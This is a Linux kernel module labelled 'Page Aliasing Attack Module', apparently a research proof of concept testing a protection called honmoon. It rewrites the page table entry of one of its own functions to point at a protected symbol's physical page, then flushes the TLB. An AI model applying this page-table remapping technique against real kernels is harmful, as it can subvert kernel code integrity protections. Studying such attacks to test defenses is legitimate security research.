#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <asm/pgtable.h>
#include <asm/page.h>
#include <asm/tlbflush.h>
#include <asm/honmoon.h>

static int __attribute__((section(".text.huge"), aligned(PMD_SIZE))) my_function(void)
{
	return 1337;
}

static int __attribute__((section(".text.huge"), aligned(PMD_SIZE))) alias_init(void)
{
	unsigned int level;
	pte_t *pte;
	unsigned long pa_honmoon_alias;
	unsigned long va_test = (unsigned long)my_function;
	unsigned long new_val;
	int (*volatile func_ptr)(void) = my_function;

	pr_info("Module loaded.\n");

	if (((unsigned long)alias_init & PMD_MASK) == ((unsigned long)my_function & PMD_MASK)) {
		pr_err("CRITICAL: alias_init and my_function are on the same 2MB page!\n");
		return -EINVAL;
	}

	pr_info("Calling my_function() first time: %d\n", func_ptr());

	pte = lookup_address(va_test, &level);
	if (!pte) {
		pr_err("Failed to lookup PTE for my_function.\n");
		return -EINVAL;
	}

	if (level != PG_LEVEL_2M) {
		pr_err("my_function is not mapped at 2M level (level=%d).\n", level);
	}

	pr_info("PTE found at %lx, value: %lx\n", (unsigned long)pte, pte_val(*pte));

	pa_honmoon_alias = __pa_symbol(honmoon_test_alias);
	pr_info("Physical address of honmoon_test_alias: %lx\n", pa_honmoon_alias);

	new_val = (pte_val(*pte) & ~PTE_PFN_MASK) | (pa_honmoon_alias & PTE_PFN_MASK);

	pr_info("Modifying PTE. Old: %lx, New: %lx\n", pte_val(*pte), new_val);

	set_pte(pte, __pte(new_val));

	__flush_tlb_all();
	pr_info("TLB flushed.\n");

	pr_info("Calling my_function() second time: %d\n", func_ptr());

	return 0;
}
module_init(alias_init);

static void __exit alias_exit(void)
{
	pr_info("Module unloaded.\n");
}
module_exit(alias_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jonguk Cheong");
MODULE_DESCRIPTION("Page Aliasing Attack Module");
